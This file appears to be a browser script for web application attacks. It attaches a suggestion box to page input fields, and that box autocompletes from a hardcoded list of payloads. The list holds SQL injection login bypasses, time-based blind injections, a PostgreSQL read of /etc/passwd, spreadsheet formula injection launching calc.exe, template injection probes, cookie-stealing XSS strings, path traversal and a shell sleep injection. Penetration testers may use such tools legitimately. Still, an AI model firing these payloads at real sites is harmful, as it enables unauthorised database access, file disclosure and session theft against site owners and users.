var suggestions = ["or 1=1","or 1=1--","or 1=1#","or 1=1/*","admin' --","admin' #","admin'/*","admin' or '1'='1","admin' or '1'='1'--","admin' or '1'='1'#","admin' or '1'='1'/*","admin'or 1=1 or ''='","admin' or 1=1","admin' or 1=1--","admin' or 1=1#","admin' or 1=1/*","admin') or ('1'='1","admin') or ('1'='1'--","admin') or ('1'='1'#","admin') or ('1'='1'/*","admin') or '1'='1","admin') or '1'='1'--","admin') or '1'='1'#","admin') or '1'='1'/*","1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055","admin\" --","admin\" #","admin\"/*","admin\" or \"1\"=\"1","admin\" or \"1\"=\"1\"--","admin\" or \"1\"=\"1\"#","admin\" or \"1\"=\"1\"/*","admin\"or 1=1 or \"\"=\"","admin\" or 1=1","admin\" or 1=1--","admin\" or 1=1#","admin\" or 1=1/*","admin\") or (\"1\"=\"1","admin\") or (\"1\"=\"1\"--","admin\") or (\"1\"=\"1\"#","admin\") or (\"1\"=\"1\"/*","admin\") or \"1\"=\"1","admin\") or \"1\"=\"1\"--","admin\") or \"1\"=\"1\"#","admin\") or \"1\"=\"1\"/*","1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055","'xor(if(now()=sysdate(),sleep(10),0))or'","+946080'%2b(SELECT+0x546f517a+WHERE+8402%3d8402+AND+(SELECT+9914+FROM+(SELECT(SLEEP(6)))ZZBM))%2b'","')+WAITFOR+DELAY+'0:0:10'--+vOpB","'%2b(select*from(select(sleep(5)))a)%2b'","'AND+(SELECT+5273+FROM+(SELECT(SLEEP(7)))NbfO)","'%2bAND+(SELECT+5273+FROM+(SELECT(SLEEP(7)))NbfO)%2b'","%2bwaitfor%2bdelay%2b'0%253a0%253a10'--","\"test';SELECT lo_import('/etc/passwd');--\", ","(select*from(select(sleep(5)))a)","+AND+(SELECT+5273+FROM+(SELECT(SLEEP(15)))NbfO)","100 AND (SELECT 5273 FROM (SELECT(SLEEP(5)))NbfO)","\" or sleep(5)=\"","' or sleep(5)='","1) or sleep(5)#","\") or sleep(5)=\"","') or sleep(5)='","1)) or sleep(5)#","\")) or sleep(5)=\"","')) or sleep(5)='","')) or sleep(5)=\"",";waitfor delay '0:0:5'--",")waitfor delay '0:0:5'--","=cmd|'/Ccalc.exe'!z","cmd|' /C calcl '!'A''","{{7*7}}[[7*7]]","{{7*7}}","{{7*'7'}}","<%= 7 * 7 %>","${7*7}","${{7*7}}","@(7+7)","#{7*7}","#{ 7 * 7 }","{{dump(app)}}","{{app.request.server.all|join(',')}}","{{config.items()}}","{{ [].class.base.subclasses() }}","{{''.class.mro()[1].subclasses()}}","{{ ''.__class__.__mro__[2].__subclasses__() }}","{{'a'.toUpperCase()}} ","{{ request }}","{{self}}","<a href=\"javascript://%0Aalert(9)\"> ","javascript://java\javascript%3aalert(document.domain)","<img/src=c onpointerenter=(prompt)()>","\"<img/src/onerror=alert(9)\"@gmail.com","\">'>\"><img/src/onerror=confirm(document.cookie)>","xss\"><body %00onControl hello onmouseleave=confirm(domain) x>","xss\"><html><select %00 onControl onpointerenter=prompt(domain) hello>","xss\"><input %00 onControl hello oninput=confirm(domain) x>","<Tag OnEvent=\"alert/*>*/(9)\"","<a href=\"javas%09script:[9].map(top['ale'+'rt'])\">","../../../tmp/lol.png","sleep(10)-- -.jpg","<svg onload=alert(document.domain)>.jpg",";sleep 10;"];
// Get all input & textarea fields on the webpage
var inputFields = document.getElementsByTagName("input","textarea");

// Listen for input in the input & textarea fields
for (var i = 0; i < inputFields.length; i++) {
  inputFields[i].addEventListener("input", function() {
    var inputValue = this.value.toLowerCase();
    var suggestionBox = document.getElementById("suggestion-box");
    if (!inputValue) {
      if (suggestionBox) {
        suggestionBox.remove();
      }
      return;
    }
    if (!suggestionBox) {
      suggestionBox = document.createElement("div");
      suggestionBox.setAttribute("id", "suggestion-box");
      this.parentNode.appendChild(suggestionBox);
    } else {
      suggestionBox.innerHTML = ""; // Clear previous suggestions
    }
    // Check if the input value matches any of the suggestions
    for (var j = 0; j < suggestions.length; j++) {
      if (suggestions[j].toLowerCase().indexOf(inputValue) !== -1) {
        var suggestion = document.createElement("div");
        suggestion.innerHTML = suggestions[j].replace(/</g, "&lt;").replace(/>/g, "&gt;");
        suggestion.addEventListener("click", (function(input) {
          return function() {
            input.value = this.innerHTML;
            suggestionBox.remove();
          };
        })(this));
        suggestionBox.appendChild(suggestion);
      }
    }
  });
}
